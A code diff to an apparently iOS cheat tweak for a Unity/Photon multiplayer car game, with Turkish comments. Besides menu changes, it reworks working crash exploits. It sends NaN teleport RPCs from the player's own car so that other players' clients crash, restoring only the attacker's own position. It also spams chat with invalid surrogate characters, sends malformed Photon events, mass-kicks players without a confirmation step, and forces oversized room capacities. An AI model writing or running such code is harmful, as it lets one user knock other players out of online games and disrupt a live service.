@@ -122,6 +122,9 @@ static NSMutableArray *g_lyrics = nil;   // satirlar
 // ==== ASCII/spam icin renk + isim dongusu (chat spammer gibi) ====
 static bool asciiColorCycle = false;     // ASCII spam'i gokkusagi renkte gonder
 static int  g_colorIdx = 0;              // donen renk indeksi
+// ==== ACCORDION MENU (katlanir bolumler) ====
+static int  g_secBuildIdx = -1;          // build sirasinda mevcut bolum sayaci
+static bool g_secOpen[24] = {0};         // her bolum acik mi (basliga basinca degisir)
 // ==== HACKER/PRO MODE ====
 static int  nameTrickMode = 0;            // 0=kapali 1=admin 2=mod 3=dev 4=hacker 5=matrix 6=glitch 7=binary
 static bool isMatrixChatEnabled = false;  // chat mesajlarini matrix stiline cevir
@@ -858,6 +861,9 @@ static bool  (*pn_createRoom)(void* name, void* opts, void* lobby, void* users) 
 static bool  (*pn_joinRoom)(void* name, void* users) = NULL;   // PhotonNetwork.JoinRoom 0x593A64C (goz at)
 static bool  (*pn_getInRoom)(void) = NULL;                     // PhotonNetwork.get_InRoom 0x5934FA4 (oda tespiti)
 static bool  (*pn_getConnReady)(void) = NULL;                  // PhotonNetwork.get_IsConnectedAndReady 0x59333A8 (oda kurma on-kosulu)
+static void* (*pn_getCurrentRoom)(void) = NULL;               // PhotonNetwork.get_CurrentRoom 0x592DA0C
+static void  (*room_setMaxPlayers)(void*, int) = NULL;        // Room.set_MaxPlayers 0x5927B70 (mevcut odayi buyut)
+static int   (*room_getMaxPlayers)(void*) = NULL;             // Room.get_MaxPlayers 0x5927B68
 static void* (*pn_getNickName)(void) = NULL;                   // PhotonNetwork.get_NickName 0x59338C0 (isim kaydet)
 static bool  (*pn_leaveRoom)(bool) = NULL;                     // PhotonNetwork.LeaveRoom 0x593B2D8 (goz at cikis)
 static bool  (*pn_setMasterClient)(void* player) = NULL;       // PhotonNetwork.SetMasterClient (kullanicinin eklemesi)
@@ -1791,7 +1797,10 @@ static void h_roomLineSetup(void* self, void* a, void* b, unsigned char c, unsig
 - (void)sendMatrixMsg;
 - (void)sendGlitchMsg;
 - (void)createNormalRoom;
+- (void)setRoomMax;
 - (void)pickRoomMax:(UIButton*)b;
+- (void)toggleSection:(UIButton*)b;
+- (void)reflowMenu;
 - (void)nativeKickAll;
 - (void)nativeKickByName;
 - (void)nativeKickPick;
@@ -2119,12 +2128,8 @@ static UIViewController* few1n_topVC(void) {
     self.contentView = [[UIView alloc] initWithFrame:CGRectMake(0,0,pw,0)];
     [self.scrollView addSubview:self.contentView];
 
+    g_secBuildIdx = -1;   // accordion: bolum sayacini sifirla (her build basinda)
     CGFloat y = 12;
-
-    // ===== FAVORILER (en ust - hizli erisim) =====
-    y = [self header:@"⭐  FAVORILER" atY:y];
-    y = [self actionRow:@"⭐  Favori Panelini Ac (hizli ac/kapat)" color:C_GOLD atY:y action:@selector(openFavorites)];
-    y = [self actionRow:@"➕  Favori Ekle / Cikar" color:C_ACCENT atY:y action:@selector(editFavorites)];
 
     y = [self header:@"⚡  HIZ (timeScale)" atY:y];
     UIView *sr = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
@@ -2274,7 +2279,8 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
 
     y = [self header:@"\U0001F511  ODA" atY:y];
     y = [self actionRow:@"🚪  Belirli Odaya Gir (isim/ID yaz)" color:C_ON atY:y action:@selector(joinRoomByName)];
-    y = [self actionRow:@"🏠  Normal Oda Kur (isim yaz — 10 sinirini as)" color:C_ON atY:y action:@selector(createNormalRoom)];
+    y = [self actionRow:@"🏠  Normal Oda Kur (isim yaz — deneysel)" color:C_ON atY:y action:@selector(createNormalRoom)];
+    y = [self actionRow:@"📈  Bu Odayı Büyüt (önce normal oda kur→gir→bas)" color:C_ON atY:y action:@selector(setRoomMax)];
     {
         UIView *rmrow = [[UIView alloc] initWithFrame:CGRectMake(12,y,pw-24,44)];
         rmrow.backgroundColor = C_CARD; rmrow.layer.cornerRadius = 12;
@@ -2346,6 +2352,8 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
 
     self.contentView.frame = CGRectMake(0,0,pw,y);
     self.scrollView.contentSize = CGSizeMake(pw,y);
+    g_secOpen[0] = true;   // ilk bolum (HIZ) acik baslasin, gerisi kapali
+    [self reflowMenu];     // ACCORDION: bolumleri katla (basliga bas -> ac/kapat)
     [w addSubview:self.panel];
     [self refreshUI];
 
@@ -2363,25 +2371,71 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
 
 - (CGFloat)header:(NSString*)text atY:(CGFloat)y {
     CGFloat pw = self.panel.bounds.size.width;
-    // sol aksан cubugu (neon)
-    UIView *bar = [[UIView alloc] initWithFrame:CGRectMake(12, y+2, 4, 16)];
+    g_secBuildIdx++;
+    int sec = g_secBuildIdx;
+    // Tek KONTEYNER: tiklanabilir katlanir baslik (tag=5000+bolum)
+    UIView *hc = [[UIView alloc] initWithFrame:CGRectMake(0, y, pw, 30)];
+    hc.tag = 5000 + sec;
+    UIView *bar = [[UIView alloc] initWithFrame:CGRectMake(12, 2, 4, 16)];
     bar.backgroundColor = C_CYAN; bar.layer.cornerRadius = 2;
     bar.layer.shadowColor = C_CYAN.CGColor; bar.layer.shadowRadius = 4;
     bar.layer.shadowOpacity = 0.8; bar.layer.shadowOffset = CGSizeMake(0,0);
-    [self.contentView addSubview:bar];
-    UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(24,y,pw-40,20)];
+    [hc addSubview:bar];
+    UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(24,0,pw-70,20)];
     l.text = [text uppercaseString]; l.textColor = C_TEXT;
     l.font = [UIFont systemFontOfSize:11 weight:UIFontWeightBlack];
-    [self.contentView addSubview:l];
-    // ince gradient ayirici cizgi
-    UIView *line = [[UIView alloc] initWithFrame:CGRectMake(12, y+22, pw-24, 1)];
+    [hc addSubview:l];
+    // katlanma oku (tag=88 -> reflow'da yon guncellenir)
+    UILabel *arrow = [[UILabel alloc] initWithFrame:CGRectMake(pw-38,0,22,20)];
+    arrow.tag = 88; arrow.text = @"▸"; arrow.textColor = C_ACCENT;
+    arrow.font = [UIFont systemFontOfSize:12 weight:UIFontWeightBold];
+    arrow.textAlignment = NSTextAlignmentCenter;
+    [hc addSubview:arrow];
+    UIView *line = [[UIView alloc] initWithFrame:CGRectMake(12, 22, pw-24, 1)];
     CAGradientLayer *lg = [CAGradientLayer layer];
     lg.frame = CGRectMake(0,0,pw-24,1);
     lg.colors = @[(id)C_CYAN.CGColor, (id)[UIColor clearColor].CGColor];
     lg.startPoint = CGPointMake(0,0.5); lg.endPoint = CGPointMake(1,0.5);
     [line.layer addSublayer:lg];
-    [self.contentView addSubview:line];
+    [hc addSubview:line];
+    UIButton *tap = [UIButton buttonWithType:UIButtonTypeCustom];
+    tap.frame = hc.bounds; tap.tag = sec;
+    [tap addTarget:self action:@selector(toggleSection:) forControlEvents:UIControlEventTouchUpInside];
+    [hc addSubview:tap];
+    [self.contentView addSubview:hc];
     return y + 30;
+}
+// KATLANMA: basliga basinca o bolumu ac/kapat + yeniden diz
+- (void)toggleSection:(UIButton*)b {
+    int sec = (int)b.tag;
+    if (sec >= 0 && sec < 24) g_secOpen[sec] = !g_secOpen[sec];
+    [self reflowMenu];
+}
+// KONUM-TABANLI YENIDEN DIZ: her baslik gorunur; altindaki satirlar bolum acıksa gorunur.
+- (void)reflowMenu {
+    CGFloat yy = 12; int curSec = -1;
+    for (UIView *v in self.contentView.subviews) {
+        NSInteger tg = v.tag;
+        if (tg >= 5000 && tg < 6000) {          // BASLIK: her zaman gorunur
+            curSec = (int)(tg - 5000);
+            CGRect f = v.frame; f.origin.y = yy; v.frame = f; v.hidden = NO;
+            UILabel *ar = (UILabel*)[v viewWithTag:88];
+            if (ar) ar.text = (curSec>=0 && curSec<24 && g_secOpen[curSec]) ? @"▾" : @"▸";
+            yy += 30;
+            continue;
+        }
+        // SATIR: mevcut bolume ait -> bolum acıksa goster
+        BOOL vis = (curSec < 0) || (curSec < 24 && g_secOpen[curSec]);
+        if (vis) {
+            CGRect f = v.frame; f.origin.y = yy; v.frame = f; v.hidden = NO;
+            yy += v.frame.size.height + 8.0;
+        } else {
+            v.hidden = YES;
+        }
+    }
+    CGFloat pw = self.panel.bounds.size.width;
+    self.contentView.frame = CGRectMake(0,0,pw,yy+12);
+    self.scrollView.contentSize = CGSizeMake(pw, yy+12);
 }
 
 - (CGFloat)toggle:(NSString*)tl sub:(NSString*)sub key:(NSString*)key atY:(CGFloat)y action:(SEL)action {
@@ -2636,18 +2690,35 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
         } @catch (...) {}
     }
 
-    // ===== NAN CRASH (Yerel - Rigidbody'ye NaN inject) =====
-    if (isNanCrashEnabled && unityAlive(g_rb)) {
+    // ===== NAN CRASH (Toggle - kendi CPS'inden NaN RPC gonder, pozisyonu geri yukle) =====
+    if (isNanCrashEnabled && unityAlive(g_rb) && g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
         @try {
-            rbSetPosIl(g_rb, &g_nanVec);
-            rbSetVelIl(g_rb, &g_nanVec);
-            rbSetAngVelIl(g_rb, &g_nanVec);
+            // Kendi pozisyonunu ONCE kaydet
+            Vec3 savedPos = {0,0,0};
+            Vec3 savedVel = {0,0,0};
+            rbGetPosIl(g_rb, &savedPos);
+            rbGetVelIl(g_rb, &savedVel);
+            // Kendi CPS'inden NaN RPC gonder (Photon SADECE kendi PhotonView'inden gonderince ag uzerinden iletir)
+            void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
+            void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
+            if (ptrOk(cps)) {
+                Vec3 nan = {nanf(""), nanf(""), nanf("")};
+                Quaternion nanQ = {nanf(""), nanf(""), nanf(""), nanf("")};
+                cps_TeleportCar_RPC(cps, nan, nanQ, NULL);
+            }
+            // HEMEN pozisyonu geri yukle - fizik tick'inden ONCE
+            rbSetPosIl(g_rb, &savedPos);
+            rbSetVelIl(g_rb, &savedVel);
+            Vec3 zeroAng = {0,0,0};
+            rbSetAngVelIl(g_rb, &zeroAng);
         } @catch (...) {}
     }
     // ===== PANIC ANINDA COKERT =====
     if (panicCrash) {
         panicCrash = false;
+        // NaN RPC'leri gonder (kendi arabani koruyarak)
         [self fireNanCrashRemote];
+        // Oda cokertme (onaysiz, hizli)
         [self fireRoomCrash];
     }
 
@@ -4305,9 +4376,9 @@ static NSString* rainbowWrap(NSString* text, int idx) {
         // Photon oda ismi BENZERSIZ olmali -> sona 1 gorunmez karakter ekle (ekranda gorunmez)
         NSString *uniq = [nm stringByAppendingString:@"​"];
         @try {
-            // ON-KOSUL: bir odada OLMAMALI + Photon'a bagli/hazir OLMALI. Yoksa CreateRoom sessizce patlar.
-            if (pn_getInRoom && pn_getInRoom()) { FLog(@"❌ Zaten bir odadasin! Once odadan CIK -> oda listesine don -> sonra kur."); return; }
-            if (pn_getConnReady && !pn_getConnReady()) { FLog(@"❌ Photon hazir degil (Master'a bagli + lobi gerekli). ANA MENU > oda listesi ekranina git, sonra kur."); return; }
+            // NOT: spammer ayni pn_createRoom'u kullanip CALISIYOR -> durum kontrolu KOYMUYORUZ (bloke etmesin).
+            // Sadece bilgi amacli durum logla, ama YINE DE kurmayi dene (spammer gibi).
+            if (pn_getInRoom && pn_getInRoom()) FLog(@"NOT: su an bir odadasin - CreateRoom bu durumda calismayabilir; oda listesi ekraninda daha iyi.");
             void* nameStr = mkStr(uniq);
             void* opts = i_object_new(g_roomOptionsClass);
             if (nameStr && opts) {
@@ -4323,6 +4394,18 @@ static NSString* rainbowWrap(NSString* text, int idx) {
     }]];
     [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
     [self present:ac];
+}
+// GUVENILIR YOL: normal odayi kurduktan sonra MEVCUT odanin kapasitesini buyut (Room.set_MaxPlayers)
+- (void)setRoomMax {
+    if (!pn_getCurrentRoom || !room_setMaxPlayers) { FLog(@"Hazir degil - il2cpp init bekle (oyuna gir)"); return; }
+    @try {
+        void* room = pn_getCurrentRoom();
+        if (!ptrOk(room)) { FLog(@"❌ Bir odada DEGILSIN! Once normal oda kur/odaya gir, SONRA bu butona bas."); return; }
+        int before = room_getMaxPlayers ? room_getMaxPlayers(room) : -1;
+        room_setMaxPlayers(room, roomMaxPlayers);
+        int after = room_getMaxPlayers ? room_getMaxPlayers(room) : -1;
+        FLog([NSString stringWithFormat:@"✓ Oda kapasitesi: %d -> %d yapildi. (Master sensen -yani odayi sen kurduysan- gecerli olur)", before, after]);
+    } @catch (...) { FLog(@"Oda kapasite hatasi"); }
 }
 - (void)pickRoomMax:(UIButton*)b {
     if      (roomMaxPlayers <= 10) roomMaxPlayers = 16;
@@ -5260,12 +5343,29 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
     [self refreshUI];
 }
 - (void)fireNanCrashLocal {
-    if (!unityAlive(g_rb)) { FLog(@"NAN: araba yok"); return; }
+    if (!unityAlive(g_rb) || !g_carPhotonSyncTypeObj || !g_mGetCompInParent || !i_runtime_invoke || !cps_TeleportCar_RPC) {
+        FLog(@"NAN: araba veya CPS hazir degil"); return;
+    }
     @try {
-        rbSetPosIl(g_rb, &g_nanVec);
-        rbSetVelIl(g_rb, &g_nanVec);
-        rbSetAngVelIl(g_rb, &g_nanVec);
-        FLog(@"NAN yerel fizik inject edildi");
+        // Pozisyonu kaydet
+        Vec3 savedPos = {0,0,0};
+        Vec3 savedVel = {0,0,0};
+        rbGetPosIl(g_rb, &savedPos);
+        rbGetVelIl(g_rb, &savedVel);
+        // Kendi CPS'inden NaN RPC gonder (ag uzerinden diger clientlara gider)
+        void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
+        void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
+        if (ptrOk(cps)) {
+            Vec3 nan = {nanf(""), nanf(""), nanf("")};
+            Quaternion nanQ = {nanf(""), nanf(""), nanf(""), nanf("")};
+            cps_TeleportCar_RPC(cps, nan, nanQ, NULL);
+            FLog(@"NAN RPC kendi CPS'inden gonderildi - uzak clientlar cokmeli");
+        }
+        // HEMEN pozisyonu geri yukle
+        rbSetPosIl(g_rb, &savedPos);
+        rbSetVelIl(g_rb, &savedVel);
+        Vec3 zero = {0,0,0};
+        rbSetAngVelIl(g_rb, &zero);
     } @catch (...) { FLog(@"NAN yerel hatasi"); }
 }
 - (void)tapNanCrashRemote {
@@ -5276,16 +5376,21 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
     @try {
         Vec3 nan = {nanf(""), nanf(""), nanf("")};
         Quaternion nanQ = {nanf(""), nanf(""), nanf(""), nanf("")};
-        // 1) Kendi CarPhotonSync'ine NaN teleport -> diger clientlar seni NaN pozisyonla gorunce Unity fizik motoru coker
+        // 1) Kendi pozisyonunu kaydet
+        Vec3 savedPos = {0,0,0};
+        Vec3 savedVel = {0,0,0};
+        rbGetPosIl(g_rb, &savedPos);
+        rbGetVelIl(g_rb, &savedVel);
+        // 2) KENDI CPS'inden NaN TeleportCar RPC gonder (Photon sadece sahibinin PhotonView'inden gonderir)
         if (g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
             void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
             void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
             if (ptrOk(cps)) {
                 cps_TeleportCar_RPC(cps, nan, nanQ, NULL);
-                FLog(@"💀 NAN TeleportCar RPC gonderildi - uzak clientlar cokmeli");
+                FLog(@"💀 NAN TeleportCar RPC kendi CPS'inden gonderildi");
             }
         }
-        // 2) HR_PhotonHandler uzerinden NaN pozisyon
+        // 3) HR_PhotonHandler uzerinden NaN pozisyon
         if (hrph_TeleportPlayerRPC) {
             void* hrph = NULL;
             if (g_hrPhotonHandlerTypeObj && g_mFindObjectOfType && i_runtime_invoke) {
@@ -5297,57 +5402,69 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
                 FLog(@"💀 NAN TeleportPlayer RPC gonderildi");
             }
         }
-        // 3) Chat'e invalid Unicode spam (TMPro parse hatasi)
+        // 4) Chat'e invalid Unicode spam
         if (chatGetInst && chatSend) {
             NSMutableString *crash = [NSMutableString string];
-            for (int i=0;i<100;i++) [crash appendFormat:@"%C", (unichar)0xDC00]; // Invalid surrogate
+            for (int i=0;i<100;i++) [crash appendFormat:@"%C", (unichar)0xDC00];
             void* mgr = chatGetInst();
             void* s = mkStr(crash);
             if (mgr && s) chatSend(mgr, s);
         }
+        // 5) HEMEN pozisyonu geri yukle - kendi oyunun cokmesin
+        rbSetPosIl(g_rb, &savedPos);
+        rbSetVelIl(g_rb, &savedVel);
+        Vec3 zero = {0,0,0};
+        rbSetAngVelIl(g_rb, &zero);
     } @catch (...) { FLog(@"NAN remote hatasi"); }
 }
 - (void)tapRoomCrash {
-    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"☠️ Odayı Çökert (NAN+Exploit)"
-        message:@"Tum oyunculara NaN paket, invalid oda ayarlari ve buffer spam gonderilir. Emin misin?" preferredStyle:UIAlertControllerStyleAlert];
-    [ac addAction:[UIAlertAction actionWithTitle:@"☠️ ÇÖKERT" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
-        [self fireRoomCrash];
-    }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
-    [self present:ac];
+    [self fireRoomCrash];
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        if (pn_leaveRoom) pn_leaveRoom(false);
+    });
 }
 - (void)fireRoomCrash {
     @try {
         FLog(@"☠️ ODA COKERTME BASLADI ☠️");
-        // 1) Once herkesi at (master isek)
-        [self nativeKickAll];
-        // 2) Tum CarPhotonSync'lere NaN gonder
+        // Pozisyonu kaydet
+        Vec3 savedPos = {0,0,0};
+        Vec3 savedVel = {0,0,0};
+        if (unityAlive(g_rb)) {
+            rbGetPosIl(g_rb, &savedPos);
+            rbGetVelIl(g_rb, &savedVel);
+        }
+        // 1) Once herkesi at (onaysiz direkt kick)
+        if (g_lobbyDummyType && g_mFindObjectsPlural && i_runtime_invoke && g_mDummyKick && pn_getPlayerListOthers) {
+            @try {
+                void* mgr = few1n_findLobbyMgr();
+                if (unityAlive(mgr)) {
+                    void* pa = pn_getPlayerListOthers();
+                    if (ptrOk(pa)) {
+                        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
+                        void** ps = (void**)((uintptr_t)pa + 0x20);
+                        for (int i = 0; i < cnt && i < 64; i++) {
+                            void* p = ps[i]; if (!ptrOk(p)) continue;
+                            void* nmeStr = ply_getNickName ? ply_getNickName(p) : NULL;
+                            if (!ptrOk(nmeStr)) continue;
+                            *(void**)((uintptr_t)mgr + 0x108) = nmeStr;
+                            @try { i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL); } @catch (...) {}
+                        }
+                    }
+                }
+            } @catch (...) {}
+        }
+        // 2) KENDI CPS'inden NaN RPC gonder (ag uzerinden diger clientlara gider)
         Vec3 nan = {nanf(""), nanf(""), nanf("")};
         Quaternion nanQ = {nanf(""), nanf(""), nanf(""), nanf("")};
-        if (g_carPhotonSyncTypeObj && g_mFindObjectsPlural && i_runtime_invoke && cps_TeleportCar_RPC) {
-            void* a[1]; a[0] = g_carPhotonSyncTypeObj;
-            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
-            if (ptrOk(arr)) {
-                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
-                void** els = (void**)((uintptr_t)arr + 0x20);
-                for (int i=0;i<c && i<64;i++) if (ptrOk(els[i])) cps_TeleportCar_RPC(els[i], nan, nanQ, NULL);
-                FLog([NSString stringWithFormat:@"%d araca NaN RPC gonderildi", c]);
+        if (unityAlive(g_rb) && g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
+            void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
+            void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
+            if (ptrOk(cps)) {
+                cps_TeleportCar_RPC(cps, nan, nanQ, NULL);
+                FLog(@"☠️ NaN RPC kendi CPS'inden gonderildi");
             }
         }
-        // 3) Odayi boz - imkansiz MaxPlayers + bos isim
-        if (pn_createRoom && i_object_new && g_roomOptionsClass) {
-            void* ns = mkStr(@"�"); // Invalid char
-            void* opts = i_object_new(g_roomOptionsClass);
-            if (ns && opts) {
-                *(bool*)((uintptr_t)opts + 0x10) = true;
-                *(bool*)((uintptr_t)opts + 0x11) = true;
-                *(int*)((uintptr_t)opts + 0x14) = 9999;
-                *(int*)((uintptr_t)opts + 0x1C) = 99999999;
-                pn_createRoom(ns, opts, NULL, NULL);
-                FLog(@"Invalid oda kurma denendi (MaxPlayers=9999)");
-            }
-        }
-        // 4) Chat'e massive invalid surrogate spam
+        // 3) Chat'e massive invalid surrogate spam
         if (chatGetInst && chatSend) {
             for (int k=0;k<8;k++) {
                 NSMutableString *crash = [NSMutableString string];
@@ -5357,9 +5474,16 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
                 if (mgr && s) chatSend(mgr, s);
             }
         }
-        // 5) Photon RaiseEvent ile bozuk event (eger pointer varsa)
+        // 4) Photon RaiseEvent ile bozuk event
         if (pn_raiseEvent) {
             @try { pn_raiseEvent(255, NULL, true, NULL); } @catch (...) {}
+        }
+        // 5) HEMEN pozisyonu geri yukle
+        if (unityAlive(g_rb)) {
+            rbSetPosIl(g_rb, &savedPos);
+            rbSetVelIl(g_rb, &savedVel);
+            Vec3 zero = {0,0,0};
+            rbSetAngVelIl(g_rb, &zero);
         }
         FLog(@"☠️ ODA COKERTME PAKETLERI TAMAMLANDI ☠️");
     } @catch (...) { FLog(@"Oda cokertme hatasi"); }
@@ -5385,6 +5509,9 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
 - (void)tapMaxPlayerOverflow {
     if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) { FLog(@"Oda kurma hazir degil"); return; }
     @try {
+        // Kendi pozisyonunu kaydet
+        Vec3 savedPos = {0,0,0};
+        if (unityAlive(g_rb)) rbGetPosIl(g_rb, &savedPos);
         void* ns = mkStr(@"OVERFLOW");
         void* opts = i_object_new(g_roomOptionsClass);
         if (ns && opts) {
@@ -5395,6 +5522,10 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
             pn_createRoom(ns, opts, NULL, NULL);
             FLog(@"MaxPlayer=INT_MAX overflow denendi");
         }
+        // Pozisyonu geri yukle (crash onlemi)
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            if (unityAlive(g_rb)) rbSetPosIl(g_rb, &savedPos);
+        });
     } @catch (...) { FLog(@"Overflow hatasi"); }
 }
 
@@ -5628,6 +5759,9 @@ static void InstallEverything(uintptr_t b) {
     pn_getInRoom              = (bool(*)(void))(b + 0x5934FA4);   // oda tespiti (otomatik karsilama)
     pn_getConnReady           = (bool(*)(void))(b + 0x59333A8);   // oda kurma on-kosulu (bagli+hazir)
     mbp_getPhotonView         = (void*(*)(void*))(b + 0x594DB48);  // dogru lobi instance secimi (kick RPC)
+    pn_getCurrentRoom         = (void*(*)(void))(b + 0x592DA0C);   // mevcut oda
+    room_setMaxPlayers        = (void(*)(void*,int))(b + 0x5927B70); // odayi buyut
+    room_getMaxPlayers        = (int(*)(void*))(b + 0x5927B68);
     pn_getNickName            = (void*(*)(void))(b + 0x59338C0);
     pn_leaveRoom              = (bool(*)(bool))(b + 0x593B2D8);
     pn_closeConnection        = (bool(*)(void*))(b + 0x5938844);   // kick direkt (hook olmadan)
